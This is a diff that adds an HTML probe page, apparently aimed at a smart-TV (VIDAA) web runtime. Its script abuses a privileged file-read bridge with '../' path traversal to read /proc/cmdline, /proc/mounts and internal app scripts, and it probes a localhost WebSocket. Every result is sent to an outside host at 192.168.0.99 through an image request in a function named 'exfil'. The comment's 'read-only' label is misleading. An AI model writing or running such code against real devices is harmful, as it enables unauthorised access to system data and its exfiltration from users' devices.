@@ -1,0 +1,31 @@
+<!doctype html>
+<!-- u7p5 — read-only: full cmdline, mounts tail, phoenix WS reach check. -->
+<html><head><meta charset="utf-8"><title>u7p5</title></head>
+<body style="background:#000;color:#0f0;font:24px monospace;padding:8px">
+<pre id="out">u7p5…</pre>
+<script>
+(function(){
+"use strict";
+var out=document.getElementById("out");
+function exfil(t){try{var i=new Image();i.src="http://192.168.0.99:8798/l?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t; exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+function rd(p){var j=hi("fileRead",{path:[p],mode:6}); return j;}
+
+// full cmdline in slices
+var c=rd("../proc/cmdline"); var s=String(c.msg||"");
+for(var i=0;i<s.length && i<700;i+=140) line("cmd["+i+"] "+s.slice(i,i+140));
+// mounts full
+var m=rd("../proc/mounts"); var ms=String(m.msg||"");
+for(var j=0;j<ms.length && j<700;j+=140) line("mnt["+j+"] "+ms.slice(j,j+140));
+// phoenix ws probe: can page open wss://localhost:9888 ? (read-only, no calls)
+try{ var w=new WebSocket("wss://localhost:9888/"); w.onopen=function(){line("ws 9888 OPEN");};
+     w.onerror=function(){line("ws 9888 ERR");}; }catch(e){ line("ws EXC "+String(e).slice(0,60)); }
+// hiutils fileRead on the fetch dir entries by guessing names (read-only)
+["../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/fetchfile.js",
+ "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js"].forEach(function(p){
+  var j=rd(p); line("read "+p.split("/").pop()+" ret="+j.ret+" len="+String(j.msg||"").length);
+});
+line("done");
+})();
+</script></body></html>
